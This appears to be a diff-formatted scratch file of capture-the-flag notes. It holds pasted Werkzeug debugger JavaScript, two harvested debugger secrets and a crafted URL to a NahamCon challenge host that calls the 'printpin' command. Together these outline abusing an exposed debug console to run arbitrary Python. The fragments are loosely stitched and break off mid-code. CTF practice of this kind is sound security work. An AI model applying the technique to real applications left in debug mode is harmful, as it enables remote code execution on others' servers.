@@ -1,0 +1,33 @@
+<p>To switch between the interactive traceback and the plaintext " +
+      'one, you can click on the "Traceback" headline. From the text ' +
+      "traceback you can also create a paste of it. " +
+      (!EVALEX
+        ? ""
+        : "For code execution mouse-over the frame you want to debug and " +
+          "click on the console icon on the right side." +
+          "<p>You can execute arbitrary Python code in the stack frames and " +
+          "there are some extra helpers available for introspection:" +
+          "shows all variables in the frame" +
+<ul><li><code>dump()</code>shows all variables in the frame" +
+<li><code>dump(obj)</code> dumps all that's known about the object</ul>");
+
+SECRET=9LHlh0UbMiIKfrfmpbGz
+
+Site to go to 
+
+/code?__debugger__=yes&cmd=resource&f=debugger.js 
+http://challenge.nahamcon.com:32331/code?__debugger__=yes&cmd=printpin&s=${9LHlh0UbMiIKfrfmpbGz}
+
+SecondSECRET=yHe3hDJDs3DODvGuHUL5
+
+return new Promise((resolve) => {
+    // Get input command.
+    const cmd = command.value;
+
+    // Setup GET request.
+    const urlPath = "";
+    const params = {
+      __debugger__: "yes",
+      cmd: cmd,
+      frm: frameID,
+      s: SECRET,
